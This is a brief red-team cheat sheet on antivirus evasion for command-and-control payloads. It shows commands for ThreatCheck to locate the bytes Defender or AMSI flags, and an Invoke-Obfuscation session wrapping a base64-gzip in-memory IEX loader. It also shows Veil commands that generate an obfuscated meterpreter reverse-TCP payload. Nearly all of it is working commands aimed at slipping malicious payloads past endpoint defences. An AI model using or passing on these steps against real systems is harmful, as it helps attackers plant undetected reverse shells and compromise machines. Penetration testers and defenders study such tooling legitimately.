# Defense Evasion

For C2 payloads, one can check their respective detection status using something like Threat Check.

## Threat Check

Cheers [Rasta Mouse](), the following is from the [Threat Check GitHub](https://github.com/rasta-mouse/ThreatCheck).
"Takes a binary as input (either from a file on disk or a URL), splits it until it pinpoints that exact bytes that the target engine will flag on and prints them to the screen."

```cmd
.\ThreatCheck.exe -f <input> -e <AMSI,Defender> -t <bin,script>
```

## Invoke-Obfuscation

https://github.com/danielbohannon/Invoke-Obfuscation

```powershell
Import-Module .\Invoke-Obfuscation.psd1
Invoke-Obfuscation
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
```

## Veil Framework

[`Veil](https://github.com/Veil-Framework/Veil) can be used to generate obfuscated payloads, such as generating meterpreter payloads.
Install for kali:
```bash
apt -y install veil && /usr/share/veil/config/setup.sh --force --silent
```

Generate obfuscated meterpreter payload:
```bash
./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
```




